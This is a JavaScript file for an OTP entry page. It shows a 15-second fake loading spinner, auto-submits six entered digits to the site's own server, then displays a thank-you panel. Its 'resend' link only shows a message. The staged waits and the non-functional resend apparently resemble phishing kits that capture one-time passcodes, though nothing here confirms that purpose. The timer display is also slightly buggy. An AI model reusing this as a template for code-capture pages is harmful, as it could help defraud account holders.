document.addEventListener("DOMContentLoaded", function() {
    const spinnerContainer = document.querySelector('.spinner-container');
    const otpContainer = document.querySelector('.otp-container');
    const thanksContainer = document.querySelector('.thanks-container');
    const otpInputs = document.querySelectorAll('.otp-inputs input');
    const otpForm = document.querySelector('form[name="otpForm"]');
    const btnConfirm = document.querySelector('.btn-2');

    // Show spinner for 15 seconds on page load
    setTimeout(() => {
        spinnerContainer.style.display = 'none';
        otpContainer.style.display = 'flex';
    }, 15000);

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            // Allow only numbers in the input fields
            this.value = this.value.replace(/[^0-9]/g, '');

            // Auto-navigate to the next input if current input is filled
            if (input.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }

            // Trigger form submission when all inputs are filled
            if (Array.from(otpInputs).every(i => i.value.length === 1)) {
                otpForm.dispatchEvent(new Event('submit'));
            }
        });
    });

    otpForm.addEventListener('submit', function(event) {
        event.preventDefault();  // Prevent the default form submission

        // All fields are mandatory checks
        let isAllFilled = Array.from(otpInputs).every(input => input.value.length === 1);
        if (!isAllFilled) {
            alert("Please fill all the fields!");
            return;
        }

        // Programmatically send form data
        let formData = new FormData(otpForm);
        fetch("/", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams(formData).toString()
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response;
        })
        .then(() => {
            otpContainer.style.display = 'none';
            spinnerContainer.style.display = 'flex';

            setTimeout(() => {
                spinnerContainer.style.opacity = 0;
                setTimeout(() => {
                    spinnerContainer.style.display = 'none';
                    thanksContainer.style.display = 'flex';
                    thanksContainer.style.opacity = 1;
                }, 500);
            }, 3000);
        })
        .catch(error => {
            console.error('Form submission error:', error);
            alert('Form submission failed, please try again.');
        });
    });
});

// Timer, progress bar, and resend button functionality
document.addEventListener("DOMContentLoaded", function() {
    // ... existing JavaScript ...

    // Timer, progress bar, and resend link functionality
    var countdown = 75; // 75 seconds countdown
    var timerDisplay = document.getElementById('timer');
    var resendLink = document.getElementById('resendLink');
    var resendConfirmation = document.getElementById('resendConfirmation');
    var timerBar = document.getElementById('timerBar');

    var timer = setInterval(function() {
        var seconds = countdown % 60;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        timerDisplay.textContent = "01:" + seconds;

        // Update progress bar width
        var progressBarWidth = (countdown / 75) * 100;
        timerBar.style.width = progressBarWidth + '%';

        if (--countdown < 0) {
            clearInterval(timer);
            resendLink.classList.add('enabled');
            resendLink.onclick = function() {
                resendConfirmation.style.display = 'block';
                // Optional: Hide the confirmation message after some time
                setTimeout(function() {
                    resendConfirmation.style.display = 'none';
                }, 5000);
            };
        }
    }, 1000);
});
